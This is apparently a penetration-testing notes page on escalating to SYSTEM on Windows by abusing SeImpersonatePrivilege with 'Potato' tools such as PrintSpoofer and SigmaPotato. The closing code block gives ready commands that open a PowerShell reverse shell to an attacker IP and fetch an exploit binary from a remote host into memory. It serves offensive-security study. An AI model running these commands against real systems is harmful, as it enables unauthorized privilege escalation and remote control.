
## Overview
---
``SeImpersonatePrivilege`` rights allow that user to "permit programs that run on behalf of that user to impersonate a client".  Specifically, exploiting this allows us to run commands and programs as SYSTEM.

## Exploitation Example
---
- ``SeImpersonatePrivilege`` rights can be checked by running ``whoami /priv``.

![[Pasted image 20230424122917.png]]

- To exploit this, we need to copy some tools to the victim.  Some common Potatoes exploiting ``SeImpersonatePrivilege`` listed below:
	- **https://github.com/tylerdotrar/SigmaPotato** *(plugging my own repository)*
	- https://github.com/BeichenDream/GodPotato
	- https://github.com/itm4n/PrintSpoofer
	- https://github.com/zcgonvh/EfsPotato

> [!info]
> - Successful execution of some of these tools can depend on what .NET version is installed on the host, what version of Windows is running, etc.  With that said, that means you may have to try a couple different executables.
> 	 - **PrintSpoofer** works with Windows 10 and Windows Server 2016 - 2019 boxes.
> 	 - **SigmaPotato** is the newest entry to the potato family and works on Windows 8 - Windows 11 and Windows Server 2012 - 2022 systems.

**Example Usage:**
```powershell
# PrintSpoofer executing a PowerShell reverse shell payload
.\PrintSpoofer.exe -c "powershell -e <encoded_powershell_reverse_shell>"

# SigmaPotato executing a PowerShell reverse shell payload
.\SigmaPotato.exe --revshell <attacker_ip> <listening_port>

# (Advanced Method) Load SigmaPotato into memory 
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/SigmaPotato.exe"))

# (Advanced Method) Execute Command as SYSTEM from memory
[SigmaPotato]::Main('<command>')
```
